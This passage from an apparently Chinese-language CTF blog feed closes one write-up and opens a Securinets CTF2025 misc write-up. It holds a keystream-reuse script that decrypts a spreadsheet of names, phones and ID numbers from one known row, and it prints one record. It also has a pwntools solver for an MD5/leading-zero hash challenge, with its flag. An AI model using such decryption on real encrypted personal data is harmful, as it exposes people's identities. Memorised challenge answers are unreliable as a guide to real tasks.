class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 派生三条 keystream（分别用于姓名/手机号/身份证列）</span></span><br><span class="line">    ks_name = derive_keystream_from_pair(c_name, args.known_name)</span><br><span class="line">    ks_phone = derive_keystream_from_pair(c_phone, args.known_phone)</span><br><span class="line">    ks_id = derive_keystream_from_pair(c_id, args.known_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对整列解密</span></span><br><span class="line">    dec_names = []</span><br><span class="line">    dec_phones = []</span><br><span class="line">    dec_ids = []</span><br><span class="line">    <span class="keyword">for</span> _, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">        dec_names.append(decrypt_with_keystream(row.get(args.name_col, <span class="string">&#x27;&#x27;</span>), ks_name))</span><br><span class="line">        dec_phones.append(decrypt_with_keystream(row.get(args.phone_col, <span class="string">&#x27;&#x27;</span>), ks_phone))</span><br><span class="line">        dec_ids.append(decrypt_with_keystream(row.get(args.id_col, <span class="string">&#x27;&#x27;</span>), ks_id))</span><br><span class="line"></span><br><span class="line">    df[<span class="string">&#x27;_dec_name&#x27;</span>] = dec_names</span><br><span class="line">    df[<span class="string">&#x27;_dec_phone&#x27;</span>] = dec_phones</span><br><span class="line">    df[<span class="string">&#x27;_dec_id&#x27;</span>] = dec_ids</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果指定目标姓名，查找并输出其身份证及 MD5</span></span><br><span class="line">    <span class="keyword">if</span> args.target_name:</span><br><span class="line">        hits = df[df[<span class="string">&#x27;_dec_name&#x27;</span>] == args.target_name]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(hits) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;未找到目标姓名: <span class="subst">&#123;args.target_name&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> idx, r <span class="keyword">in</span> hits.iterrows():</span><br><span class="line">                idval = r[<span class="string">&#x27;_dec_id&#x27;</span>]</span><br><span class="line">                md5 = hashlib.md5(idval.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;行索引:&#x27;</span>, idx)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;姓名:&#x27;</span>, r[<span class="string">&#x27;_dec_name&#x27;</span>])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;手机号:&#x27;</span>, r[<span class="string">&#x27;_dec_phone&#x27;</span>])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;身份证号:&#x27;</span>, idval)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;身份证 MD5:&#x27;</span>, md5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可选保存解密结果</span></span><br><span class="line">    <span class="keyword">if</span> args.out:</span><br><span class="line">        <span class="comment"># 保存部分列以免泄露原密文（但也可保存全部）</span></span><br><span class="line">        outdf = df.copy()</span><br><span class="line">        outdf.to_csv(args.out, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已保存解密后的表到:&#x27;</span>, args.out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 exp.py \</span><br><span class="line">--input 个人信息表.xlsx \</span><br><span class="line">--known-row 0 \</span><br><span class="line">--known-name <span class="string">&quot;蒋宏玲&quot;</span> \</span><br><span class="line">--known-phone 17145949399 \</span><br><span class="line">--known-id 220000197309078766 \</span><br><span class="line">--target-name <span class="string">&quot;何浩璐&quot;</span> \</span><br><span class="line">--out decrypted.csv</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">行索引: <span class="number">859</span></span><br><span class="line">姓名: 何浩璐</span><br><span class="line">手机号: <span class="number">14736125420</span></span><br><span class="line">身份证号: <span class="number">120000197404101676</span></span><br><span class="line">身份证 MD5: fbb80148b75e98b18d65be446f505fcc</span><br></pre></td></tr></table></figure><p>这个方向<code>ChatGPT-Pro</code>也能梭很多题，可惜牟钱啊</p><h1 id="else"><a href="#else" class="headerlink" title="else"></a>else</h1><p>没落的<code>Sloth</code>，没什么人打比赛了，今年圈圈都不在校队打了，小凳没一个报名的，就这样吧……</p><p>后面等大佬的<code>wp</code>出来，再学学<code>web</code>的思路……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;web1-ez-unserialize&quot;&gt;&lt;a href=&quot;#web1-ez-unserialize&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Securinets CTF2025 Misc-WriteUp</title>
    <link href="https://hvang10.github.io/2025/10/07/Securinets-CTF2025-Misc-WriteUp/"/>
    <id>https://hvang10.github.io/2025/10/07/Securinets-CTF2025-Misc-WriteUp/</id>
    <published>2025-10-06T16:18:49.000Z</published>
    <updated>2025-10-06T16:41:30.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="md7"><a href="#md7" class="headerlink" title="md7"></a>md7</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&quot;readline&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">&quot;md5&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">  <span class="attr">input</span>: process.<span class="property">stdin</span>,</span><br><span class="line">  <span class="attr">output</span>: process.<span class="property">stdout</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">askQuestion</span>(<span class="params">query</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> rl.<span class="title function_">question</span>(query, resolve));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalize</span>(<span class="params">numStr</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d+$/</span>.<span class="title function_">test</span>(numStr)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> numStr.<span class="title function_">replace</span>(<span class="regexp">/^0+/</span>, <span class="string">&quot;&quot;</span>) || <span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Welcome to our hashing factory &quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;let&#x27;s see how much trouble you can cause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateHash</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  input = input</span><br><span class="line">    .<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    .<span class="title function_">reverse</span>()</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function"><span class="params">d</span> =&gt;</span> ((<span class="built_in">parseInt</span>(d, <span class="number">10</span>) + <span class="number">1</span>) % <span class="number">10</span>).<span class="title function_">toString</span>())</span><br><span class="line">    .<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> prime1 = <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">const</span> prime2 = <span class="number">37</span>;</span><br><span class="line">  <span class="keyword">let</span> hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> altHash = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; input.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    hash = hash * prime1 + input.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    altHash = altHash * prime2 + input.<span class="title function_">charCodeAt</span>(input.<span class="property">length</span> - <span class="number">1</span> - i);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> factor = <span class="title class_">Math</span>.<span class="title function_">abs</span>(hash - altHash) % <span class="number">1000</span> + <span class="number">1</span>; </span><br><span class="line">  <span class="keyword">const</span> normalized = +input;</span><br><span class="line">  <span class="keyword">const</span> modulator = (hash % factor) + (altHash % factor); </span><br><span class="line">  <span class="keyword">const</span> balancer = <span class="title class_">Math</span>.<span class="title function_">floor</span>(modulator / factor) * factor;</span><br><span class="line">  <span class="keyword">return</span> normalized + balancer % <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> used = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> input1 = <span class="keyword">await</span> <span class="title function_">askQuestion</span>(<span class="string">`(<span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>/100) Enter first number: `</span>);</span><br><span class="line">      <span class="keyword">const</span> input2 = <span class="keyword">await</span> <span class="title function_">askQuestion</span>(<span class="string">`(<span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>/100) Enter second number: `</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> numStr1 = <span class="title function_">normalize</span>(input1.<span class="title function_">trim</span>());</span><br><span class="line">      <span class="keyword">const</span> numStr2 = <span class="title function_">normalize</span>(input2.<span class="title function_">trim</span>());</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (numStr1 === <span class="literal">null</span> || numStr2 === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Only digits are allowed.&quot;</span>);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (numStr1 === numStr2) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (used.<span class="title function_">has</span>(numStr1) || used.<span class="title function_">has</span>(numStr2)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;😈&quot;</span>);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      used.<span class="title function_">add</span>(numStr1);</span><br><span class="line">      used.<span class="title function_">add</span>(numStr2);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> hash1 = <span class="title function_">generateHash</span>(numStr1);</span><br><span class="line">      <span class="keyword">const</span> hash2 = <span class="title function_">generateHash</span>(numStr2);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">md5</span>(hash1.<span class="title function_">toString</span>()) !== <span class="title function_">md5</span>(hash2.<span class="title function_">toString</span>())) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣾⠿⢫⡤⠀⣄⢈⠛⠷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠛⠋⢡⣾⡿⣿⡴⠁⠀⠀⣿⣾⣿⡁⠈⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣦⣤⡀⠀⠀⠀⠀⢀⣤⡾⠟⠋⠐⠂⠸⠿⣿⣿⠿⠀⠩⠛⠀⠛⠻⣦⡅⠀⠀⠀⠀⠙⢧⡄⠀⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠌⠙⠷⣦⣴⡾⠟⡡⠴⠂⠀⠀⠀⠀⠀⠀⠙⠦⠴⣤⣄⡀⠛⠶⣽⣮⡀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⣰⢠⢞⡛⠉⠙⠋⠁⠀⠀⠀⠀⠀⠀⣀⡀⢄⡂⢰⡘⢿⢻⣤⢃⠄⡉⢻⡗⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⣸⡇⠀⠀⠀⠀⠀⠀⠀⢀⡀⢾⣋⡝⣬⣟⣴⣫⣟⢾⣶⣿⣾⣤⣭⣿⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣧⣿⡇⠀⠀⠀⠀⠀⠀⢠⣼⠏⣾⣿⣽⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⡀⡀⣽⣇⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣼⡧⠀⠀⠈⢀⣱⣘⣿⣿⣋⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣤⠃⡜⢻⣟⣿⡇⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣯⣽⡗⣌⣺⠡⣘⣾⣿⣿⣿⣯⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣹⣿⣿⣿⢧⣙⣔⣻⣿⣿⣿⡀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⡹⢛⠶⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⢌⠹⢹⣾⣿⢿⡇⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠿⣷⣌⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠐⢪⡐⣣⣿⣿⣿⠇⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⡿⠀⠉⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢉⣦⣍⣝⣿⣿⠏⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⠁⢰⠀⠁⢘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣩⠒⢢⢰⡘⣿⣿⡏⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⠟⠀⠀⠈⢩⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠱⠀⠈⠄⢂⣿⣿⣿⠁⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡄⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⡿⢟⣿⣿⣿⣿⢛⣿⣿⣿⡿⠉⠀⠀⠀⠀⢠⣸⣿⡏⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠟⠛⠛⠳⣶⣿⣟⢆⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⠱⣋⠔⡢⠑⣎⠣⣜⣶⠿⠃⠀⠀⠀⠀⠀⠠⠇⣿⠁⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⣤⣤⣼⠏⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣄⠀⠀⠀⠀⠀⠈⠹⣿⡆⡑⠈⠄⠑⠨⢹⣥⣲⡶⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⠀⠀⠀⠀⢀⣠⡴⢾⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣅⠀⢈⠡⢩⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⠀⠀⢀⣀⣴⣾⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣥⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⢣⠀⠀⠀⢀⠀⠀⠀⢢⣾⣿⣿⣶⡼⢣⣽⣿⣻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⠀</span></span><br><span class="line"><span class="string">⣤⡾⠋⠉⠀⠀⠹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⢦⣄⣀⣠⣤⣴⣶⣿⣿⠟⠉⠀⠀⠀⠀⢳⡀⠀⢸⠟⢿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀</span></span><br><span class="line"><span class="string">⣿⠁⠀⠀⠀⠀⠈⠻⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣮⣭⣥⣶⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⢷⣦⡀⢛⡾⣿⣿⣿⣿⢿⣭⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀</span></span><br><span class="line"><span class="string">⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣟⡛⡟⢿⢻⣟⣿⣿⠔⠂⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣾⡐⣿⣿⣿⣼⡿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆</span></span><br><span class="line"><span class="string">⣟⠀⠀⠀⠀⣠⡄⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⢸⡯⢜⠩⢖⡩⡟⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣷⣿⣿⡿⠟⠟⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡍</span></span><br><span class="line"><span class="string">⡇⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⢸⣿⢎⡑⢮⣇⣇⠀⠀⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡜</span></span><br><span class="line"><span class="string">⡇⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⢼⣯⠀⠀⠀⠀⠀⠘⣿⢦⣱⣾⣿⠋⠀⠀⠀⠹⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡼</span></span><br><span class="line"><span class="string">⡿⠀⣀⠀⠀⢺⣇⠀⠀⠀⠀⣸⣿⡀⠀⠀⠀⣀⣼⠟⠛⠉⠉⠀⠀⠀⠀⠀⢀⣼⣿⣶⡀⠀⠤⢀⡤⣤⣙⡴⣀⢤⣄⠲⠤⢄⡀⣀⡀⢀⣀⣀⡀⠄⡀⡀⢀⡀⢀⠀⡄⢤⡈⣵⡐</span></span><br><span class="line"><span class="string">⣷⣀⠈⡄⢈⠽⣿⡀⠆⢀⡤⢸⣿⣷⣠⣠⣼⠟⠁⠀⢀⣤⡤⣤⣤⣤⢶⣩⣾⣿⣿⠼⣇⠀⡆⢦⡔⢦⢭⡹⣬⢏⠶⣭⣛⢮⡝⣧⣾⡱⢮⣱⣙⢦⡵⣩⡶⣜⣬⡳⣎⣧⣝⡶⣽</span></span><br><span class="line"><span class="string">⠟⠷⠿⠛⠾⠿⡿⢷⣯⣬⣵⣷⣾⣿⣯⣿⣷⣠⣤⣼⣩⣴⣦⣭⣴⣽⣿⣿⣟⣩⢃⡾⢀⢣⠼⣦⢽⣚⡶⣽⣎⣿⣻⢶⣯⣟⣾⣳⢯⣟⣯⣷⣻⢮⣽⣷⣻⡽⣾⡽⣽⢾⡽⣞⣷`</span>);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\ngg , get your flag\n&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(flag);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    rl.<span class="title function_">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><code>generateHash()</code>函数对输入的处理是反转，每位数字加一模十，然后拼接回去<br><code>return normalized + balancer % 1;</code> <code>balancer</code>是整数，所以不用管它，这里就只剩<code>normalized</code><br><code>const normalized = +input;</code>这里是<strong>前导零</strong>的一个利用<br>比如<code>(1,19)</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> -&gt; <span class="string">&#x27;2&#x27;</span> -&gt; +<span class="string">&#x27;2&#x27;</span> -&gt; <span class="number">2</span></span><br><span class="line"><span class="number">19</span> -&gt; <span class="string">&#x27;91&#x27;</span> -&gt; <span class="string">&#x27;02&#x27;</span> -&gt; +<span class="string">&#x27;02&#x27;</span> &gt; <span class="number">2</span></span><br></pre></td></tr></table></figure><p>这样它们的字符串<code>md5</code>就一样了，我们只要找到<code>100</code>组各不一样的数字即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    s = s[::-<span class="number">1</span>]</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        digit = <span class="built_in">int</span>(char)</span><br><span class="line">        new_digit = (digit + <span class="number">1</span>) % <span class="number">10</span></span><br><span class="line">        res += <span class="built_in">str</span>(new_digit)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_transform</span>(<span class="params">t: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> t:</span><br><span class="line">        digit = <span class="built_in">int</span>(char)</span><br><span class="line">        original_digit = (digit - <span class="number">1</span> + <span class="number">10</span>) % <span class="number">10</span></span><br><span class="line">        res += <span class="built_in">str</span>(original_digit)</span><br><span class="line">    <span class="keyword">return</span> res[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_pairs</span>():</span><br><span class="line">    pairs = []</span><br><span class="line">    used_numbers = <span class="built_in">set</span>()</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(pairs) &lt; <span class="number">100</span>:</span><br><span class="line">        s1 = <span class="built_in">str</span>(i)</span><br><span class="line">        t1 = transform(s1)</span><br><span class="line">        t2 = <span class="string">&quot;0&quot;</span> + t1</span><br><span class="line">        s2 = reverse_transform(t2)</span><br><span class="line">        <span class="keyword">if</span> s1 != s2 <span class="keyword">and</span> s1 <span class="keyword">not</span> <span class="keyword">in</span> used_numbers <span class="keyword">and</span> s2 <span class="keyword">not</span> <span class="keyword">in</span> used_numbers:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(transform(s1)) == <span class="built_in">int</span>(transform(s2)):</span><br><span class="line">                pairs.append((s1, s2))</span><br><span class="line">                used_numbers.add(s1)</span><br><span class="line">                used_numbers.add(s2)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line"></span><br><span class="line">solution_pairs = generate_pairs()</span><br><span class="line">conn = remote(<span class="string">&#x27;numbers.p2.securinets.tn&#x27;</span>, <span class="number">7011</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">100</span>):</span><br><span class="line">    num1, num2 = solution_pairs[i]</span><br><span class="line">    conn.sendlineafter(<span class="string">b&quot;Enter first number: &quot;</span>, num1.encode())</span><br><span class="line">    conn.sendlineafter(<span class="string">b&quot;Enter second number: &quot;</span>, num2.encode())</span><br><span class="line">    conn.recvline()</span><br><span class="line"><span class="built_in">print</span>(conn.recvall().decode().strip())</span><br><span class="line"><span class="comment"># Securinets&#123;floats_in_js_xddddd&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Easy-Jail"><a href="#Easy-Jail" class="headerlink" 